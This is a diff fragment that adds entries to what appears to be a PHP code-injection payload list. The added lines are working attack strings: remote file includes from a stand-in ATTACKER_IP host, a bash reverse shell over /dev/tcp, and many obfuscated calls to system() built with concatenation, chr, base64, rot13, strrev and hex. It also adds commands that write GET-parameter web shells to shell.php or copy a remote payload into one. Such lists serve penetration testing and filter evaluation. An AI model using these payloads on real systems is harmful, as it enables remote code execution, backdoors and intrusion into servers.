@@ -62,3 +62,26 @@ ECHO%20FILEPERMS("/etc/passwd");
 print_r(glob("*.txt"));
 print_r(glob("*.html"));
 print_r(glob("*.config"));
+
+include("http://ATTACKER_IP/evil.php")
+include_once("http://ATTACKER_IP/evil.php")
+require("http://ATTACKER_IP/evil.php")
+require_once("http://ATTACKER_IP/evil.php")
+proc_open("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'", array(), $pipes)
+$a='sys'.'tem';$a('id')
+call_user_func('sys'.'tem', 'id')
+call_user_func_array('sys'.'tem', array('id'))
+array_map('sys'.'tem', array('id'))
+array_filter(array('id'), 'sys'.'tem')
+$arr=array('id');array_walk($arr, function($a){('sys'.'tem')($a);})
+$f=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);$f('id')
+$f=base64_decode('c3lzdGVt');$f('id')
+$f=str_rot13('flfgrz');$f('id')
+$f=strrev('metsys');$f('id')
+$f="\x73\x79\x73\x74\x65\x6d";$f('id')
+$f=function(){('sys'.'tem')('id');};$f()
+ob_start('sys'.'tem');echo 'id';ob_end_flush()
+$_='sys'.'tem';$_('id')
+file_put_contents('shell.php', '<?php $a="sys"."tem";$a($_GET["cmd"]); ?>')
+file_put_contents('shell.php', '<?php ($_GET["f"])($_GET["c"]); ?>')
+copy('http://ATTACKER_IP/evil.txt', 'shell.php')
